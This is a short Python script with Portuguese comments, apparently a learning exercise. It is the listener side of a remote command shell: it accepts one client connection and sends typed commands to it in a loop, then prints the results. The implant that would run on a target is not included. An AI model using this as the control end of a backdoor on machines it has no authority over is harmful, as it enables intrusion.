import socket

# definir o host da sua máquina
HOST = '10.0.0.115' # '192.168.43.82'
# porta que vai ser usada
PORT = 8081 # 2222
# vamos criar um socket
server = socket.socket()
# habilitar e configurar a conexão do nosso socket
server.bind((HOST, PORT))
print('[+] Server Started')
print('[+] Listening For Client Connection ...')
# colocar o socket como escuta
server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} Client connected to the server')

# criando um laço verdadeiro para enviar os comandos
while True:
    command = input('Enter Command : ')
    command = command.encode()
    # enviando o comando encodado 
    client.send(command)
    print('[+] Command sent')
    output = client.recv(1024)
    # usar um encoding para definir o formato de caracteres a ser inserido no socket
    output = output.decode(encoding='iso8859-1')
    print(f"Output: {output}")

# iso8859-1 ISO/IEC 8859-1 é o conjunto de caracteres padrão da Maioria dos navegadores.  conhecido como latin-1 é um padrão de caracteres latino amplamente utilizado
